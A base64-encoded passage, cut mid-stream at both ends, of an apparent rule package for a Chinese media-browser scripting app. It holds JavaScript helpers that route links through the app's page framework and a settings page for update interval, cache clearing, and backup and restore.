fSwgUUlOR19USVRMRSwgeyB1cmw6IE1ZX1JVTEUudXJsLCBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZ2VuTXlSdWxlKCkpKSwgaXNJbmRleDogaXNJbmRleCB9KSArICc7JyArIHBhcmFtMC5zbGljZSgzKVxcbiAgICB9XFxuICAgIG1ldGhvZF9zZXRMYXN0Q2hhcHRlclJ1bGUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTApXFxufVxcbi8vIOWKqOaAgeaWsOWinuWHveaVsOWKq+aMgVxcbmFkZEl0ZW1BZnRlciA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xKSB7XFxuICAgIGlmIChBcnJheS5pc0FycmF5KHBhcmFtMSkpIHBhcmFtMSA9IHBhcmFtMS5tYXAoaGlqYWNrRWwpXFxuICAgIGVsc2UgcGFyYW0xID0gaGlqYWNrRWwocGFyYW0xKVxcbiAgICBtZXRob2RfYWRkSXRlbUFmdGVyLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEpXFxufVxcbmFkZEl0ZW1CZWZvcmUgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSkge1xcbiAgICBpZiAoQXJyYXkuaXNBcnJheShwYXJhbTEpKSBwYXJhbTEgPSBwYXJhbTEubWFwKGhpamFja0VsKVxcbiAgICBlbHNlIHBhcmFtMSA9IGhpamFja0VsKHBhcmFtMSlcXG4gICAgbWV0aG9kX2FkZEl0ZW1CZWZvcmUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTAsIHBhcmFtMSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLlh73mlbDlt6XlhbdcIixcInBhdGhcIjpcImZ1bmNUb29sc1wiLFwicnVsZVwiOlwibGV0IHsgUUlOR19USVRMRSwgTVlfUlVMRSwgaXNJbmRleCB9ID0gJC5pbXBvcnRQYXJhbVxcbmlmICghTVlfUlVMRSkgTVlfUlVMRSA9IHt9XFxuXFxuZnVuY3Rpb24gcnVuQ29kZShydWxlKSB7XFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgW2lucHV0LCBjb2RlXSA9IHJ1bGUuc3BsaXQoJy5qczonKVxcbiAgICAgICAgcmV0dXJuIGNvZGUgPyBldmFsKGNvZGUpIDogcnVsZVxcbiAgICB9IGNhdGNoIChlKSB7IHJldHVybiBydWxlIH1cXG59XFxuLy8g6aaW6aG16ZO+5o6l5pu/5o2i5YiG57G7XFxuZnVuY3Rpb24gaW5kZXhVcmwocGFyYW0pIHtcXG4gICAgTVlfUlVMRSA9IEpTT04ucGFyc2UoYmFzZTY0RGVjb2RlKE1ZX1JVTEUpKVxcbiAgICBsZXQgcGFnZU51bSA9IHBhcnNlSW50KHBhcmFtLnNwbGl0KCcjIyMnKVsxXSksXFxuICAgICAgICB1cmwgPSBNWV9SVUxFLnVybCxcXG4gICAgICAgIHsgZnlBbGwsIHRhYkhlYWRlciB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgTVlfUlVMRSkpXFxuXFxuICAgIHVybCA9IHRhYkhlYWRlci5zZXRVcmwoZnlBbGwgPyB1cmwucmVwbGFjZSgvZnlBbGwvZywgJyQke2Z5QWxsfScpIDogdXJsLnJlcGxhY2UoL2Z5KGNsYXNzfGFyZWF8eWVhcnxzb3J0KS9nLCAnJCR7ZnkkMX0nKSlcXG4gICAgdXJsID0gdXJsLnJlcGxhY2UoL2Z5cGFnZSg/OkAoLT9cXFxcZCspQCk/KD86XFxcXCooXFxcXGQrKUApPy9nLCAoXywgc3RhcnQsIHNwYWNlKSA9PiBwYXJzZUludChzdGFydCB8fCAwKSArIDEgKyAocGFnZU51bSAtIDEpICogcGFyc2VJbnQoc3BhY2UgfHwgMSkpXFxuICAgIHVybCA9IC9eKFtcXFxcc1xcXFxTXSo/KSg/OlxcXFxbZmlyc3RQYWdlPShbXFxcXHNcXFxcU10qPylcXFxcXSk/KD86KFxcXFwuanM6W1xcXFxzXFxcXFNdKj8pKT8kLy5leGVjKHVybClcXG4gICAgaWYgKHBhZ2VOdW0gPT0gMSAmJiB1cmxbMl0pIHVybFsxXSA9IHVybFsyXVxcbiAgICBpZiAodXJsWzNdICYmICF1cmxbMV0uaW5jbHVkZXMoJy5qczonKSkgdXJsWzFdICs9IHVybFszXVxcbiAgICByZXR1cm4gcnVuQ29kZSh1cmxbMV0pXFxufVxcblxcbmZ1bmN0aW9uIHBhcmFtSGFuZGxlKHVybFBhcmFtLCB1YSwgdXJsVG1wKSB7XFxuICAgIGxldCBjaGFyc2V0LCBwYXJhbVRtcFxcbiAgICB0cnkgeyAvLyDpk77mjqXnmoTnvJbnoIHjgIFVQeWSjFJlZmVyZXLlupTor6XmmK/pppblhYjnu6fmib/pppbpobXpk77mjqVcXG4gICAgICAgIFssICwgY2hhcnNldCwgcGFyYW1UbXBdID0gdXJsVG1wLnNwbGl0KCc7JylcXG4gICAgICAgIHBhcmFtVG1wID0gcGFyYW1UbXAubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXG4gICAgfSBjYXRjaCAoZSkgeyBwYXJhbVRtcCA9IFtdIH1cXG4gICAgbGV0IFVzZXJBZ2VudCA9IHBhcmFtVG1wLmZpbmQoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSksXFxuICAgICAgICBSZWZlcmVyID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKVxcbiAgICB1cmxQYXJhbVswXSA9IHVybFBhcmFtWzBdIHx8ICdHRVQnXFxuICAgIHVybFBhcmFtWzFdID0gdXJsUGFyYW1bMV0gfHwgY2hhcnNldCB8fCAnVVRGLTgnXFxuICAgIHRyeSB7XFxuICAgICAgICB1cmxQYXJhbVsyXSA9IHVybFBhcmFtWzJdLm1hdGNoKC9eeyguKil9JC8pWzFdLnNwbGl0KCcmJicpXFxuICAgIH0gY2F0Y2ggKGUpIHsgdXJsUGFyYW1bMl0gPSBbXSB9XFxuICAgIC8vIOa3u+WKoOWFqOWxgFVB5ZKM5LiK57qnUmVmZXJlclxcbiAgICBpZiAoIXVybFBhcmFtWzJdLnNvbWUoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSkpIHtcXG4gICAgICAgIGlmIChVc2VyQWdlbnQpIHVybFBhcmFtWzJdLnB1c2goVXNlckFnZW50KVxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ3BjJylcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBQQ19VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgICAgIGVsc2UgaWYgKHVhID09ICdtb2JpbGUnKVxcbiAgICAgICAgICAgIHVybFBhcmFtWzJdLnB1c2goJ1VzZXItQWdlbnRAJyArIE1PQklMRV9VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgfVxcbiAgICBpZiAoUmVmZXJlciAmJiAhdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKSlcXG4gICAgICAgIHVybFBhcmFtWzJdLnB1c2goUmVmZXJlcilcXG4gICAgdXJsUGFyYW1bMl0gPSAneycgKyB1cmxQYXJhbVsyXS5qb2luKCcmJicpICsgJ30nXFxuICAgIHJldHVybiB1cmxQYXJhbS5qb2luKCc7JylcXG59XFxuLy8g6aKE5aSE55CG5bm25Yid5aeL5YyWY29uZmlnXFxuZnVuY3Rpb24gcnVuUHJlUnVsZShydWxlKSB7XFxuICAgIGlmICgodHlwZW9mIE1ZX1BBR0UgIT0gJ3VuZGVmaW5lZCcgJiYgIE1ZX1BBR0UgPT0gMSkgJiZcXG4gICAgICAgICAoaXNJbmRleCB8fCAhZ2V0TXlWYXIoJyRwcmVSdWxlXycgKyBNWV9SVUxFLnRpdGxlKSkpIHtcXG4gICAgICAgIGV2YWwocnVsZSlcXG4gICAgICAgIHB1dE15VmFyKCckcHJlUnVsZV8nICsgTVlfUlVMRS50aXRsZSwgJ1QnKVxcbiAgICB9XFxuICAgIGxldCBfY2ZnID0gZ2V0TXlWYXIoJ2luaXRDb25maWcnLCAne30nKVxcbiAgICBpZiAoX2NmZyAmJiBfY2ZnLmxlbmd0aCA+IDApIHtcXG4gICAgICAgIGNvbmZpZyA9IEpTT04ucGFyc2UoX2NmZylcXG4gICAgfVxcbn1cXG4vLyDmraPmlofop6PmnpDpgJrnlKjlj5jph49cXG5mdW5jdGlvbiBnZW5NeVJ1bGUoKSB7XFxuICAgIGxldCBSVUxFID0gT2JqZWN0LmFzc2lnbih7fSwgTVlfUlVMRSlcXG4gICAgZGVsZXRlIFJVTEUubGFzdF9jaGFwdGVyX3J1bGVcXG4gICAgZGVsZXRlIFJVTEUucHJlUnVsZVxcbiAgICBkZWxldGUgUlVMRS5wYWdlTGlzdFxcbiAgICBkZWxldGUgUlVMRS5wYWdlc1xcbiAgICByZXR1cm4gUlVMRVxcbn1cXG5cXG5mdW5jdGlvbiBnZW5FeFVybCh1cmwpIHtcXG4gICAgdXJsID0gdXJsLnNwbGl0KCc7JylcXG4gICAgcmV0dXJuIHVybC5zaGlmdCgpICsgJzsnICsgcGFyYW1IYW5kbGUodXJsLCBNWV9SVUxFLnVhLCBNWV9SVUxFLnVybClcXG59XFxuXFxuaGlqYWNrTGF6eVJ1bGUgPSAkLnRvU3RyaW5nKChRSU5HX1RJVExFLCBNWV9QQVJBTVMpID0+IHtcXG4gICAgaWYgKCFNWV9SVUxFKSBNWV9SVUxFID0ge31cXG4gICAgTVlfUEFSQU1TID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoTVlfUEFSQU1TKSlcXG4gICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcbiAgICB2YXIge1xcbiAgICAgICAgcGFyYW1IYW5kbGUsXFxuICAgICAgICBnZW5FeFVybCxcXG4gICAgICAgIGhpamFja0xhenlSdWxlLFxcbiAgICAgICAgaGlqYWNrRWxcXG4gICAgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcbn0sIFFJTkdfVElUTEUsIGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeSh7IHVybDogTVlfUlVMRS51cmwsIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLCBpc0luZGV4OiBpc0luZGV4IH0pKSlcXG5cXG5mdW5jdGlvbiBoaWphY2tFbChlbCkge1xcbiAgICBpZighZWwgfHwgdHlwZW9mIGVsICE9ICdvYmplY3QnKSByZXR1cm5cXG4gICAgaWYgKCFlbC5leHRyYSkgZWwuZXh0cmEgPSB7fVxcbiAgICBlbC5jb2xfdHlwZSA9IGVsLmNvbF90eXBlIHx8IE1ZX1JVTEUuY29sX3R5cGVcXG4gICAgbGV0IE5PV19SVUxFID0gT2JqZWN0LmFzc2lnbihnZW5NeVJ1bGUoKSwgeyBwYXJhbXM6IGVsLmV4dHJhIH0pXFxuXFxuICAgIGlmICh0eXBlb2YgZWwudXJsICE9ICdzdHJpbmcnIHx8XFxuICAgICAgICBbJ3g1X3dlYnZpZXdfc2luZ2xlJywgJ2lucHV0J10uc29tZSgodikgPT4gZWwuY29sX3R5cGUgPT0gdikgfHxcXG4gICAgICAgIFsn5rW36ZiU6KeG55WMJywgJ2phdmFzY3JpcHQ6J10uc29tZSgodikgPT4gZWwudXJsLnN0YXJ0c1dpdGgodikpIHx8XFxuICAgICAgICBbJ3J1bGUnLCAncGljcycsICd0b2FzdCcsICdjb3B5JywgJ2VkaXRGaWxlJywgJ3g1JywgJ3g1V2ViVmlldycsICd4NVBsYXknLCAnd2ViJywgJ3g1UnVsZScsICd3ZWJSdWxlJyxcXG4gICAgICAgICAgICAnZG93bmxvYWQnLCAnc2hhcmUnLCAnZmlsZVNlbGVjdCcsICd2aWRlbyddLnNvbWUoKHYpID0+IGVsLnVybC5zdGFydHNXaXRoKHYgKyAnOi8vJykpKSB7XFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuc3RhcnRzV2l0aCgnaW5wdXQ6Ly8nKSkge1xcbiAgICAgICAgbGV0IHBhcmEgPSBKU09OLnBhcnNlKGVsLnVybC5zbGljZSg4KSlcXG4gICAgICAgIGlmIChwYXJhLmpzKSBwYXJhLmpzID0gaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBwYXJhLmpzXFxuICAgICAgICBlbC51cmwgPSAnaW5wdXQ6Ly8nICsgSlNPTi5zdHJpbmdpZnkocGFyYSlcXG4gICAgICAgIHJldHVybiBlbFxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdjb25maXJtOi8vJykpIHtcXG4gICAgICAgIGxldCByZUluZGV4ID0gZWwudXJsLmluZGV4T2YoJy5qczonKVxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuc3RhcnRzV2l0aCgnc2VsZWN0Oi8vJykpIHtcXG4gICAgICAgIGxldCBwYXJhID0gSlNPTi5wYXJzZShlbC51cmwuc2xpY2UoOSkpXFxuICAgICAgICBpZiAocGFyYS5qcykgcGFyYS5qcyA9IGhpamFja0xhenlSdWxlICsgJzsnICsgcGFyYS5qc1xcbiAgICAgICAgZWwudXJsID0gJ3NlbGVjdDovLycgKyBKU09OLnN0cmluZ2lmeShwYXJhKVxcbiAgICAgICAgcmV0dXJuIGVsXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAcnVsZT0nKSkge1xcbiAgICAgICAgbGV0IFtfLCB1cmwsIHJ1bGVdID0gZWwudXJsLm1hdGNoKC9eKFtcXFxcc1xcXFxTXSo/KUBydWxlPShbXFxcXHNcXFxcU10qKSQvKVxcbiAgICAgICAgZWwudXJsID0gdXJsXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gcnVsZVxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2NvbF90eXBlID0gTVlfUlVMRS5jb2xfdHlwZVxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdoaWtlcjovL3BhZ2UvJykpIHtcXG4gICAgICAgIGlmIChlbC51cmwuaW5jbHVkZXMoJ3J1bGU9JykgfHwgZWwuZXh0cmEucnVsZSlcXG4gICAgICAgICAgICByZXR1cm4gZWxcXG4gICAgICAgIGxldCBbXywgcGF0aCwgZmxhZywgcGFyYW1zXSA9IGVsLnVybC5tYXRjaCgvXmhpa2VyOlxcXFwvXFxcXC9wYWdlXFxcXC8oLis/KSgjLio/KT8oPzpcXFxcPyguKikpPyQvKSxcXG4gICAgICAgICAgICBzdWJQYWdlID0gTVlfUlVMRS5wYWdlTGlzdC5maW5kKCh2KSA9PiB2LnBhdGggPT0gcGF0aCksXFxuICAgICAgICAgICAgc3ViVXJsID0gKHBhcmFtcyB8fCAnJykuc3BsaXQoJyYnKS5maW5kKCh2KSA9PiB2LnN0YXJ0c1dpdGgoJ3VybD0nKSlcXG4gICAgICAgIGVsLnVybCA9IChzdWJVcmwgPyBzdWJVcmwuc2xpY2UoNCkucmVwbGFjZSgv77yf77yfL2csICc/JykucmVwbGFjZSgv77yG77yGL2csICcmJykgOiAoZWwuZXh0cmEgfHwge30pLnVybCkgfHwgJ2hpa2VyOi8vZW1wdHknICsgZmxhZyArICc/JyArIChwYXJhbXMgfHwgJycpXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gc3ViUGFnZS5ydWxlXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfY29sX3R5cGUgPSBzdWJQYWdlLmNvbF90eXBlXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAbGF6eVJ1bGU9JykpIHtcXG4gICAgICAgIGxldCByZUluZGV4ID0gZWwudXJsLmluZGV4T2YoJy5qczonKVxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChpc0luZGV4KSB7XFxuICAgICAgICBpZiAoIU1ZX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSB8fCAvaGlrZXI6XFxcXC9cXFxcLyg/IWVtcHR5LiskKS8udGVzdChlbC51cmwpKSByZXR1cm4gZWxcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBlbFxcbiAgICB9XFxuICAgIGVsLmV4dHJhID0gT2JqZWN0LmFzc2lnbih7fSwgZWwuZXh0cmEsIHtcXG4gICAgICAgIHVybDogZ2VuRXhVcmwoZWwudXJsKSxcXG4gICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShOT1dfUlVMRSkpLFxcbiAgICAgICAgcGFnZVRpdGxlOiBpc0luZGV4ICYmIGVsLnRpdGxlXFxuICAgIH0pXFxuICAgIGVsLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXG4gICAgcmV0dXJuIGVsXFxufVxcbiQuZXhwb3J0cyA9IHtcXG4gICAgcnVuQ29kZTogcnVuQ29kZSxcXG4gICAgaW5kZXhVcmw6IGluZGV4VXJsLFxcbiAgICBwYXJhbUhhbmRsZTogcGFyYW1IYW5kbGUsXFxuICAgIHJ1blByZVJ1bGU6IHJ1blByZVJ1bGUsXFxuICAgIGdlbk15UnVsZTogZ2VuTXlSdWxlLFxcbiAgICBnZW5FeFVybDogZ2VuRXhVcmwsXFxuICAgIGhpamFja0xhenlSdWxlOiBoaWphY2tMYXp5UnVsZSxcXG4gICAgaGlqYWNrRWw6IGhpamFja0VsXFxufVxcblwifV0sXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIuaVpuS8plwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vcGFnZS9Db25maWc/cnVsZT3mlabkvKYmI25vUmVjb3JkSGlzdG9yeSNcIixcImNvbF90eXBlXCI6XCJpY29uXzJfcm91bmRcIixcImZpbmRfcnVsZVwiOlwianM6XFxuYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCAnY2xlYXJNeVZhcihcXFwic29ydEZsYWdcXFwiKTtyZWZyZXNoUGFnZSgpJylcXG5zZXRQYWdlVGl0bGUoJ+KamSDovbvlkIjpm4borr7nva4g4pqZJylcXG5jb25zdCBRSU5HX1RJVExFID0gZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpLFxcbiAgICB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG5sZXQgZGF0YSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2RhdGFMb2FkP3J1bGU9JyArIFFJTkdfVElUTEUsIHRydWUpLFxcbiAgICBlbCA9IFt7XFxuICAgICAgICB0aXRsZTogJzxiPiDmuIXpmaTnvJPlrZjvvIznq4vljbPmm7TmlrAgPHNtYWxsPiDvvIjln7rkuo7ov5znqIvku5PlupPvvIzkuI3opoHpopHnuYHngrnlh7vvvIknLFxcbiAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh1cmwpID0+IHtcXG4gICAgICAgICAgICBpZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgfHwgdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+S7k+W6k+S4uuacrOWcsOaWh+S7tu+8jOS4jeS8mui/m+ihjOe8k+WtmO+8jOacrOWKn+iDveS5n+aXoOaViCdcXG4gICAgICAgICAgICBkZWxldGVDYWNoZSh1cmwpXFxuICAgICAgICAgICAgYmFjayhmYWxzZSlcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5pu05pawJ1xcbiAgICAgICAgfSwgdXJsKSxcXG4gICAgICAgIGltZzogJ2hpa2VyOi8vaW1hZ2VzL2ljb240JyxcXG4gICAgICAgIGNvbF90eXBlOiAnYXZhdGFyJ1xcbiAgICB9XSxcXG4gICAgdXBkYXRlSW50ZXJ2YWwgPSByZWFkRmlsZSgndXBkYXRlSW50ZXJ2YWwnKSB8fCAnMScsXFxuICAgIG5ld1dpbmRvdyA9IHJlYWRGaWxlKCduZXdXaW5kb3cnKSxcXG4gICAgdGFiRm9sZCA9IHJlYWRGaWxlKCd0YWJGb2xkJyksXFxuICAgIGRpc2FibGVDdXN0b20gPSByZWFkRmlsZSgnZGlzYWJsZUN1c3RvbScpLFxcbiAgICBlZGl0TW9kZSA9IGRpc2FibGVDdXN0b20gPyAn5a+85YWl5rW36ZiUJyA6IGdldE15VmFyKCdlZGl0TW9kZScsICflkK/nlKgv56aB55SoJylcXG5cXG5lbC5wdXNoKHtcXG4gICAgdGl0bGU6ICcgIPCfkqEg5pu05paw6aKR546HOiAnICsgKHVwZGF0ZUludGVydmFsID09IDAgPyAn5omL5YqoJyA6IHVwZGF0ZUludGVydmFsICsgJ+WkqScpICsgJyAgJyxcXG4gICAgdXJsOiAkKHVwZGF0ZUludGVydmFsLCAn6L6T5YWl5pu05paw6Ze06ZqU77yI5aSp77yJ77yM5Li6MOWImeaJi+WKqOabtOaWsFxcXFxu5pys5Zyw5paH5Lu26ZO+5o6l5peg5pWIJykuaW5wdXQoKCkgPT4ge1xcbiAgICAgICAgaW5wdXQgPSBwYXJzZUludChpbnB1dClcXG4gICAgICAgIGlmIChOdW1iZXIuaXNOYU4oaW5wdXQpKSBpbnB1dCA9IDFcXG4gICAgICAgIGVsc2UgaWYgKGlucHV0IDwgMSkgaW5wdXQgPSAwXFxuICAgICAgICBzYXZlRmlsZSgndXBkYXRlSW50ZXJ2YWwnLCBpbnB1dC50b1N0cmluZygpKVxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbn0sIHtcXG4gICAgdGl0bGU6ICcgIPCflqUg54us56uL6aaW6aG1OiAnICsgKG5ld1dpbmRvdyA/ICfmmK8nIDogJ+WQpicpICsgJyAgJyxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChuZXdXaW5kb3cpID0+IHtcXG4gICAgICAgIHNhdmVGaWxlKCduZXdXaW5kb3cnLCBuZXdXaW5kb3cgPyAnJyA6ICdUJylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfSwgbmV3V2luZG93KSxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbn0sIHtcXG4gICAgdGl0bGU6ICcgIPCfkqAg5YiG57G75oqY5Y+gOiAnICsgKHRhYkZvbGQgPyAn5pivJyA6ICflkKYnKSArICcgICcsXFxuICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodGFiRm9sZCkgPT4ge1xcbiAgICAgICAgc2F2ZUZpbGUoJ3RhYkZvbGQnLCB0YWJGb2xkID8gJycgOiAnVCcpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0sIHRhYkZvbGQpLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJyAg8J+SvCDlpIfku73mgaLlpI0gICcsXFxuICAgIHVybDogJChbJ+Wkh+S7vScsICfmgaLlpI0nXSwgMSkuc2VsZWN0KChRSU5HX1RJVExFLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSA9PiB7XFxuICAgICAgICBsZXQgdXJsID0gZ2V0TXlWYXIoJ3JlbW90ZVVybCcpXFxuICAgICAgICBpZiAoIXVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpICYmICF1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcbiAgICAgICAgICAgIHVybCA9ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcydcXG4gICAgICAgIGVsc2UgaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovL3BhZ2UvJykpIHVybCA9ICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgaWYgKGlucHV0ID09ICflpIfku70nKSByZXR1cm4gJCgnaGlrZXI6Ly9maWxlcy90bXAvJyArIFFJTkdfVElUTEUgKyAnX2JhY2t1cC5qc29uJywgJ+i+k+WFpeWkh+S7vei3r+W+hCcpXFxuICAgICAgICAgICAgLmlucHV0KCh1cmwsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gcmVxdWVzdCh1cmwpLFxcbiAgICAgICAgICAgICAgICAgICAgY3VzdG9tRGF0YSA9IHJlYWRGaWxlKCdjdXN0b21EYXRhJylcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKGlucHV0LCBKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnRlcnZhbDogdXBkYXRlSW50ZXJ2YWwsXFxuICAgICAgICAgICAgICAgICAgICBuZXdXaW5kb3c6IG5ld1dpbmRvdyxcXG4gICAgICAgICAgICAgICAgICAgIHRhYkZvbGQ6IHRhYkZvbGQsXFxuICAgICAgICAgICAgICAgICAgICBkaXNhYmxlQ3VzdG9tOiBkaXNhYmxlQ3VzdG9tLFxcbiAgICAgICAgICAgICAgICAgICAgY3VzdG9tRGF0YTogY3VzdG9tRGF0YSxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzOiBydWxlc1xcbiAgICAgICAgICAgICAgICB9KSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suWkh+S7ve+8jOazqOaEj+iLpeS7k+W6k+S4uuWtkOmhtemdouWImeS4jeWkh+S7vSdcXG4gICAgICAgICAgICB9LCB1cmwsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pXFxuICAgICAgICBlbHNlIHJldHVybiAkKCdoaWtlcjovL2ZpbGVzL3RtcC8nICsgUUlOR19USVRMRSArICdfYmFja3VwLmpzb24nLCAn6L6T5YWl5aSH5Lu96Lev5b6EJykuaW5wdXQoKHVybCkgPT4ge1xcbiAgICAgICAgICAgIGxldCB7IHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20sIGN1c3RvbURhdGEsIHJ1bGVzIH0gPSBKU09OLnBhcnNlKHJlcXVlc3QoaW5wdXQpKVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCd1cGRhdGVJbnRlcnZhbCcsIHVwZGF0ZUludGVydmFsKVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCduZXdXaW5kb3cnLCBuZXdXaW5kb3cpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ3RhYkZvbGQnLCB0YWJGb2xkKVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgZGlzYWJsZUN1c3RvbSlcXG4gICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIGN1c3RvbURhdGEpXFxuICAgICAgICAgICAgaWYgKHJ1bGVzKSB3cml0ZUZpbGUodXJsLCBydWxlcylcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suaBouWkje+8jOWmguaenOS4jeaDs+WQjOatpei/nOeoi+S7k+W6k++8jOWPr+S7peiuvue9ruabtOaWsOmikeeOh+S4uuaJi+WKqCdcXG4gICAgICAgIH0sIHVybClcXG4gICAgfSwgUUlOR19USVRMRSwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSksXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG59LCB7XFxuICAgIHRpdGxlOi